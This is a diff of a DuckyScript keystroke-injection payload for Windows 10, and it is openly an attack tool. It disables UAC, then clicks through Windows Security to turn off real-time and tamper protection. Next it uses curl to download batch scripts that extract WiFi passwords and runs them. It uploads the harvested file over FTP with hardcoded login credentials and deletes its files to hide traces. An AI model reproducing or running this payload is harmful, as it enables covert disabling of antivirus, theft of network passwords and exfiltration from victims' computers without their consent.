@@ -1,7 +1,7 @@
 REM Title:         Disable_UAC_and_AV
 REM Description    Disable UAC and download py script to disable Realtime and tamper protection
 REM Author:        FX17
-REM Version:       1.0
+REM Version:       2.0
 REM Target:        Windows 10
 REM Attackmodes:   HID
 
@@ -15,6 +15,8 @@ STRING uac
 DELAY 500
 ENTER
 DELAY 500
+ALT y
+DELAY 1000
 TAB
 DELAY 500
 DOWN
@@ -25,43 +27,54 @@ ENTER
 DELAY 500
 ALT y
 
-REM Open CMD
-DELAY 5000
-GUI r
+REM Disable AV and Tamper control
 DELAY 1000
-STRING cmd
-ENTER
-DELAY 1000
-STRING cd Documents
+GUI d
+DELAY 500
+CTRL ESC
+DELAY 500
+STRING Windows Security
+DELAY 500
 ENTER
 DELAY 500
-REM Install the "Virus" to disable AV
-STRING git clone https://github.com/Keiranos/AVDeact
-ENTER
-DELAY 1000
-STRING cd AVDeact
 ENTER
 DELAY 500
-STRING py -m pip install -r requirements.txt
+GUI UP
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 500
 ENTER
-DELAY 15000
-STRING py main.py
-ENTER
-DELAY 20000
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+SHIFT SPACE
+DELAY 200
+SHIFT TAB
+DELAY 200
+SHIFT TAB
+DELAY 200
+SHIFT TAB
+DELAY 200
+SHIFT TAB
+DELAY 200
+SHIFT TAB
+DELAY 200
+SHIFT SPACE
+DELAY 200
 ALT F4
-
-REM Delete the "virus" and close cmd
-DELAY 500
-STRING cd ..
-ENTER
-DELAY 500
-STRING rmdir /s .\AVDeact
-ENTER
-DELAY 500
-STRING Y
-ENTER
-DELAY 500
-ALT F4
+DELAY 200
 
 REM WiFi Password Collection!
 REM Open CMD
@@ -74,16 +87,16 @@ STRING cd Documents
 ENTER
 DELAY 500
 REM Download the yoinking tools
-STRING git clone https://github.com/Keiranos/WiFi-Password-Extract
+STRING curl --output "Password Collection.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/Pass%20collection.bat
 ENTER
 DELAY 2000
-STRING cd WiFi-Password-Extract
+STRING curl --output "SSIDYoink.bat" -OL https://raw.githubusercontent.com/Keiranos/WiFi-Password-Extract/main/SSIDYoink.bat
 ENTER
 DELAY 200
 STRING SSIDYoink.bat
 ENTER
 DELAY 1000
-STRING "Pass collection.bat"
+STRING "Password collection.bat"
 ENTER
 DELAY 1000
 
@@ -93,13 +106,13 @@ ENTER
 DELAY 200
 STRING o
 ENTER
-STRING [FTP Address] 21
+STRING 127.0.0.1 21
 ENTER
 DELAY 200
-STRING [Username]
+STRING FX17
 ENTER
 DELAY 200
-STRING [Password]
+STRING Keiran1712
 ENTER
 DELAY 1000
 STRING put A.txt
@@ -109,13 +122,19 @@ STRING quit
 ENTER
 REM Quit and delete files&folders
 DELAY 500
-STRING cd ..
+STRING del /f A.txt
 ENTER
 DELAY 500
-STRING rmdir /s .\WiFi-Password-Extract
+STRING del /f out.txt
+DELAY 500
 ENTER
 DELAY 500
-STRING Y
+STRING del /f "Password Collection.bat"
+DELAY 500
+ENTER
+DELAY 500
+STRING del /f SSIDYoink.bat
+DELAY 500
 ENTER
 DELAY 500
 ALT F4
